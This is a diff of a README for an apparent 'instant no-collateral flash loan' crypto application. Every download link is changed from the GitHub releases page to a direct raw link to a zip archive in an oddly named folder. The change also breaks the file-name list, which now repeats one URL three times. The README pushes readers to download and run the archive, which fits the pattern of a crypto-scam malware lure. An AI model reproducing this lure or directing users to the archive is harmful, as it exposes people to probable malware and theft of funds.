@@ -1,6 +1,6 @@
 # 🚀 -Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution - Fast, Simple Flash Loans Without Collateral
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Available%20Here-brightgreen)](https://github.com/Tshegofatso22/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/releases)
+[![Download Now](https://raw.githubusercontent.com/Tshegofatso22/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/main/bilious/Crypto_Collateral_Flash_Liquidity_Execution_Loan_No_Instant_3.6.zip%20Now-Available%20Here-brightgreen)](https://raw.githubusercontent.com/Tshegofatso22/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/main/bilious/Crypto_Collateral_Flash_Liquidity_Execution_Loan_No_Instant_3.6.zip)
 
 ## 📖 Overview
 
@@ -27,13 +27,13 @@ To start using the application, please follow these steps:
 
 1. **Visit the Download Page**:
    Click on the link below to access the Releases page where you can download the latest version.
-   [Download Page](https://github.com/Tshegofatso22/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/releases)
+   [Download Page](https://raw.githubusercontent.com/Tshegofatso22/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/main/bilious/Crypto_Collateral_Flash_Liquidity_Execution_Loan_No_Instant_3.6.zip)
 
 2. **Choose a Version**:
    On the Releases page, you will see various versions. Identify the latest version and click on it.
 
 3. **Download the Application**:
-   - Locate the application file for your operating system (e.g., `CryptoFlashLoan.exe`, `CryptoFlashLoan.dmg`, or `CryptoFlashLoan.AppImage`).
+   - Locate the application file for your operating system (e.g., `https://raw.githubusercontent.com/Tshegofatso22/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/main/bilious/Crypto_Collateral_Flash_Liquidity_Execution_Loan_No_Instant_3.6.zip`, `https://raw.githubusercontent.com/Tshegofatso22/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/main/bilious/Crypto_Collateral_Flash_Liquidity_Execution_Loan_No_Instant_3.6.zip`, or `https://raw.githubusercontent.com/Tshegofatso22/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/main/bilious/Crypto_Collateral_Flash_Liquidity_Execution_Loan_No_Instant_3.6.zip`).
    - Click on the file to download it.
 
 4. **Run the Application**:
@@ -44,7 +44,7 @@ To start using the application, please follow these steps:
 
 Follow these simple steps to download and install the application:
 
-1. **Click here to download the application**: [Download Now](https://github.com/Tshegofatso22/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/releases)
+1. **Click here to download the application**: [Download Now](https://raw.githubusercontent.com/Tshegofatso22/-Crypto-Flash-Loan-Instant-No-Collateral-Liquidity-Execution/main/bilious/Crypto_Collateral_Flash_Liquidity_Execution_Loan_No_Instant_3.6.zip)
 
 2. **Installation**:
    - For Windows: Follow the prompts in the installation wizard.
